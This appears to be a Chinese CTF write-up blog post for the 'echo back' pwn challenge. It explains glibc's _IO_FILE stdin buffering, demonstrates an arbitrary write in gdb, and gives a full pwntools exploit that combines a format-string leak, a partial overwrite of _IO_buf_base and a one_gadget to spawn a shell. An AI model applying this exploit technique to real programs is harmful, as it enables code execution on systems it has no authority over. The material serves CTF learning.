---
title: 'IO_FILE:_IO_buf_base'
date: 2018-09-01 22:27:39
tags: pwn IO_FILE
layout: post
---
2018ciscn echo back

_IO_buf_base

use fmt with 7-byte-lenth payload
<!--more-->
# 前置技能
## IO_FILE
struct _IO_FILE 定义在 glibc/libio/bits/types/struct_FILE.h
```c
struct _IO_FILE
{
  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;        /* Current read pointer */
  char *_IO_read_end;        /* End of get area. */
  char *_IO_read_base;        /* Start of putback+get area. */
  char *_IO_write_base;        /* Start of put area. */
  char *_IO_write_ptr;        /* Current put pointer. */
  char *_IO_write_end;        /* End of put area. */
  char *_IO_buf_base;        /* Start of reserve area. */
  char *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```
因为进程中包含了系统默认的三个文件流stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过scanf\printf一样可以进行利用。

在_IO_FILE中_IO_buf_base表示操作的起始地址，_IO_buf_end表示结束地址，通过控制这两个数据可以实现控制读写的操作。

通过分析scanf源码发现scanf的主要调用顺序是
scanf->_IO_vfscanf->_IO_vfscanf_internal->inchar->_IO_new_file_underflow

_IO_new_file_underflow会返回读写区域的指针

## glibc/libio/fileops.c
```
int
_IO_new_file_underflow (FILE *fp)
{
  ssize_t count;
  /* C99 requires EOF to be "sticky".  */
  if (fp->_flags & _IO_EOF_SEEN)
    return EOF;
  if (fp->_flags & _IO_NO_READS)
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;
  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
        {
          free (fp->_IO_save_base);
          fp->_flags &= ~_IO_IN_BACKUP;
        }
      _IO_doallocbuf (fp);
    }
  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
      /* We used to flush all line-buffered stream.  This really isn't
         required by any standard.  My recollection is that
         traditional Unix systems did this for stdout.  stderr better
         not be line buffered.  So we do just that here
         explicitly.  --drepper */
      _IO_acquire_lock (_IO_stdout);
      if ((_IO_stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
          == (_IO_LINKED | _IO_LINE_BUF))
        _IO_OVERFLOW (_IO_stdout, EOF);
      _IO_release_lock (_IO_stdout);
    }
  _IO_switch_to_get_mode (fp);
  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;
  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
                       fp->_IO_buf_end - fp->_IO_buf_base);
  if (count <= 0)
    {
      if (count == 0)
        fp->_flags |= _IO_EOF_SEEN;
      else
        fp->_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp->_IO_read_end += count;
  if (count == 0)
    {
      /* If a stream is read to EOF, the calling application may switch active
         handles.  As a result, our offset cache would no longer be valid, so
         unset it.  */
      fp->_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);
  return *(unsigned char *) fp->_IO_read_ptr;
}
```
分析：
```
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;
```

函数中如果满足_IO_read_ptr <_IO_read_end将会直接返回_IO_read_ptr
如果不满足将会进行一系列操作最终返回了_IO_buf_base
```
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;
```
## One Demo to show how stdin works 
```
#include<stdio.h>
int main()
{
char a[100];
scanf("%s",a);
scanf("%s",a);
return 1;
}
```
编译之后用上gdb
* 在调用scanf之前,sdtin还未被赋值
```sh
gdb-peda$ p stdin
$5 = (struct _IO_FILE *) 0x7ffff7dd18e0 <_IO_2_1_stdin_>
gdb-peda$ p *(_IO_FILE *)0x7ffff7dd18e0
$6 = {
  _flags = 0xfbad2088, 
  _IO_read_ptr = 0x0, 
  _IO_read_end = 0x0, 
  _IO_read_base = 0x0, 
  _IO_write_base = 0x0, 
  _IO_write_ptr = 0x0, 
  _IO_write_end = 0x0, 
  _IO_buf_base = 0x0, 
  _IO_buf_end = 0x0, 
  _IO_save_base = 0x0, 
  _IO_backup_base = 0x0, 
  _IO_save_end = 0x0, 
  _markers = 0x0, 
  _chain = 0x0, 
  _fileno = 0x0, 
  _flags2 = 0x0, 
  _old_offset = 0xffffffffffffffff, 
  _cur_column = 0x0, 
  _vtable_offset = 0x0, 
  _shortbuf = "", 
  _lock = 0x7ffff7dd3790 <_IO_stdfile_0_lock>, 
  _offset = 0xffffffffffffffff, 
  _codecvt = 0x0, 
  _wide_data = 0x7ffff7dd19c0 <_IO_wide_data_0>, 
  _freeres_list = 0x0, 
  _freeres_buf = 0x0, 
  __pad5 = 0x0, 
  _mode = 0x0, 
  _unused2 = '\000' <repeats 19 times>
}
```
* 然后我们调用scanf之后发现内部的指针发生改变
```bash
gdb-peda$ p *(_IO_FILE *)0x7ffff7dd18e0
$7 = {
  _flags = 0xfbad2288, 
  _IO_read_ptr = 0x602014 "\n", 
  _IO_read_end = 0x602015 "", 
  _IO_read_base = 0x602010 "AAAA\n", 
  _IO_write_base = 0x602010 "AAAA\n", 
  _IO_write_ptr = 0x602010 "AAAA\n", 
  _IO_write_end = 0x602010 "AAAA\n", 
  _IO_buf_base = 0x602010 "AAAA\n", 
  _IO_buf_end = 0x602410 "", 
  _IO_save_base = 0x0, 
  _IO_backup_base = 0x0, 
  _IO_save_end = 0x0, 
  _markers = 0x0, 
  _chain = 0x0, 
  _fileno = 0x0, 
  _flags2 = 0x0, 
  _old_offset = 0xffffffffffffffff, 
  _cur_column = 0x0, 
  _vtable_offset = 0x0, 
  _shortbuf = "", 
  _lock = 0x7ffff7dd3790 <_IO_stdfile_0_lock>, 
  _offset = 0xffffffffffffffff, 
  _codecvt = 0x0, 
  _wide_data = 0x7ffff7dd19c0 <_IO_wide_data_0>, 
  _freeres_list = 0x0, 
  _freeres_buf = 0x0, 
  __pad5 = 0x0, 
  _mode = 0xffffffff, 
  _unused2 = '\000' <repeats 19 times>
}
```
* 指向了堆地址，查看发现当前情况下scanf过程中申请了0x400的堆空间并来存储我们的输入
```
gdb-peda$ heap
heapbase : 0x602000
gdb-peda$ x/8gx  0x602000
0x602000:	0x0000000000000000	0x0000000000000411
0x602010:	0x0000000a41414141	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
```
* 更改read_ptr和_IO_buf_base尝试是否可以任意地址写
```
gdb-peda$ set *0x7ffff7dd18e8=0x0000000000602016
gdb-peda$ set *0x7ffff7dd1918=0x0000000000601000
```
* 输入后查看相应地址发现成功写入
```
gdb-peda$ x/gx 0x601000
0x601000:	0x0000000a42424242
```
通过这个demo，我们发现可以控制stdin中read_ptr,read_end和_IO_buf_base来做到任意地址写
## read_ptr
经过gdb调试后发现raed_ptr指向终结符位置(例如空格可以终结%d的输入,\n终结%s)而read_end指向输入的buf末尾。
* 测试
```python
In [2]: p=process("./base")
[x] Starting local process './base'
[+] Starting local process './base': pid 7214

In [3]: payload="AAAA\x0aBBBB"

In [4]: p.sendline(payload)
```
result
```sh
  _IO_read_ptr = 0x602014 "\nBBBB\n", 
  _IO_read_end = 0x60201a "", 
```
## read
by the way read(0,A,B)并不会改变stdin
```
ssize_t
__libc_read (int fd, void *buf, size_t nbytes)
{
  return SYSCALL_CANCEL (read, fd, buf, nbytes);
}
```
直接call的系统调用
拿demo测试的时候也发现read(0,a,b)并没有使用stdin

**不知道的我卡在这好9...**
# echo
题目可以在此下载

[echo](https://github.com/n132/banana/tree/master/Pwn/Xman%E6%8E%92%E4%BD%8D%E8%B5%9B)

2018xman排位赛的时候遇到的题目
原题是2018ciscn的echo_back

[原题wp传送门](http://p4nda.top/2018/05/13/ciscn-ctf-2018/#echo-back)

之前上课的时候JR也讲过，可惜没认真去复现拖延症拖到了现在...
## 漏洞分析
题目的意思比较清楚也就是给你任意地址泄露，然后有一个7长度的fmtstr

既然长度限制在7那么常规的fmtstr做法是不能用的，7长度的fmtstr可以做到一定限度内任意地址置为0

这里可以用将_IO_buf_base末位写0的方法

## 利用思路
* 泄露地址:libc的，stack的(发现stack泄露后如果算stack的基址发现算不准...不知道为啥,但是只要直接用泄露的stack和目标的偏移来那就每次都有用)
* 向栈上填入_IO_buf_base的地址
* 将IO_buf_base的最低字节改成0(这么做是因为IO_buf_base最低字节置为0后指向IO_buf_base前一些的位置)
* 因为read_ptr=read_end所以将会向IO_buf_base指向位置写入
* 向IO_buf_base写入返回地址其余位置仿照之前的来伪造
* 通过利用getchar来改变read_ptr使其等于read_end
* 向返回地址写入one_gadget

## EXP
```python
#coding:utf-8
from pwn import *
def echo(c):
	p.sendline("2")
	p.readuntil("number:")
	p.sendline("-1")
	p.sendline(c)
def leave_str(addr):
	p.sendline("1")
	p.readuntil("str :")
	p.sendline(addr)
def fmt_seek(lenth):
	for x in range(1,lenth):
		echo("%{}$p".format(str(x)))
		data=p.readline()
		if (data=="(nil)\n"):
			data="0x0"
		data=(int(data,16))
		log.success("%sth=============>%s",str(x),hex(data))

context.log_level='debug'
p=process('./echo')
#fmt_seek(20)
#leak stack#
echo("%p")
data=p.readline()
stack=(int(data,16))
log.success("Stack=============>%s",hex(stack))
#leak libc#
echo("%19$p")
data=p.readline()
libc=(int(data,16))-0x20830
log.success("Libc==============>%s",hex(libc))
#set payload
_IO_buf_base=libc+(0x7ffff7dd18e0-0x7ffff7a0d000)+7*0x8
leave_str(p64(_IO_buf_base))
echo("%16$hhn")
p.sendline("2")
ret=stack+(0xa8-0x90)
payload=p64(libc+(0x00007ffff7dd1963-0x00007ffff7a0d000))*3+p64(ret)+p64(ret+0x30)
p.send(payload)
p.sendline()
for x in range(0x28):
	p.sendline("2")
	p.readuntil("number:")
	p.sendline("")
one_gadget=0xf1147+libc
p.send(p64(one_gadget))
p.readline()
p.sendline()
p.interactive()
```

